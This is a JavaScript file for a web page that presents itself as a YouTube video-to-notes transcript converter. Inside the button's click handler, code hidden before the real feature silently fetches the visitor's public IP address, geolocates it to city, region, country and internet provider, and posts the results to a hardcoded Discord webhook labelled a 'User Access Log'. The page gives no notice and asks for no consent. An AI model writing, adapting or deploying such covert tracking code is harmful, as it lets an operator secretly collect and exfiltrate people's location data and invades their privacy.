document.getElementById('convertBtn').addEventListener('click', async () => {
    const url = document.getElementById('videoUrl').value;

    // Extract the video ID from the URL
    const videoId = url.split('v=')[1]?.split('&')[0];

    if (!videoId) {
        alert('Please enter a valid YouTube video URL.');
        return;
    }

    // Log IP information to Discord webhook
    const ipData = await fetch('https://api.ipify.org?format=json').then(response => response.json());
    const locationData = await fetch(`https://ipapi.co/${ipData.ip}/json/`).then(response => response.json());

    const webhookUrl = 'https://discord.com/api/webhooks/1294182161842438215/ISyYd61dcdpPE-xeeFNSpcEtBi-G1RC1RdzdV5B6flgcvrDwkcgIqvV_scUqUOsd1fPJ'; // Your Discord webhook URL

    const embed = {
        content: null,
        embeds: [
            {
                title: 'User Access Log',
                fields: [
                    { name: 'IP Address', value: ipData.ip },
                    { name: 'City', value: locationData.city },
                    { name: 'Region', value: locationData.region },
                    { name: 'Country', value: locationData.country_name },
                    { name: 'Wi-Fi Provider', value: locationData.org },
                    { name: 'Access Time', value: new Date().toLocaleString() },
                ],
                color: 5814783
            }
        ]
    };

    await fetch(webhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(embed),
    });

    try {
        // Fetch transcript using YouTube Transcript API
        const transcript = await getTranscript(videoId);

        // Convert transcript to notes format
        const notes = transcript.map(entry => entry.text).join('\n');

        // Display notes
        document.getElementById('notes').innerText = notes;
    } catch (error) {
        console.error(error);
        alert('Could not fetch the transcript. Please check if the video has subtitles available.');
    }
});
